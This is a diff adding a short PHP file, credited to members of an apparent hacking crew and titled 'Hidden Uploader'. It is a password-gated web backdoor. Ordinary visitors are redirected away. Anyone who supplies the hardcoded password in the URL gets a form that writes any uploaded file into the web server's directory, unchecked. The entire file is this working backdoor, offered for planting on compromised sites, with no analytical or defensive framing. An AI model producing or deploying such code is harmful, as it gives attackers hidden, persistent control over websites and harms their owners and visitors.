@@ -1,0 +1,13 @@
+//Author By Mr.Bro_Tx - Mr.FMR
+//Greetz : Mr.TenWap - IndoXploit -T3754K1T1 - Hama Security & All Member Anonymous Cyber Team 
+//email : bedoelkcyber@gmail.com
+<?php
+$en = "/";
+if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Sukses Upload : => <A href='$file' target='_blank'>Terupload disini</A>";}else {$result="Failed to upload...!";}}$password="t3754k1t1";if($_GET['do']==$password){echo '<br /><br /><br /><html><head><title>T3754K1T1 Hidden Uploader</title><br></head><body><center><form action="" method="post" enctype="multipart/form-data">
+<input type="file" name="files" />
+<input type="submit" name="uploaded" value="Upload">
+</form>'.$result.'</center></body></html>';}
+else{
+	header("Location:$en");;
+}
+?>
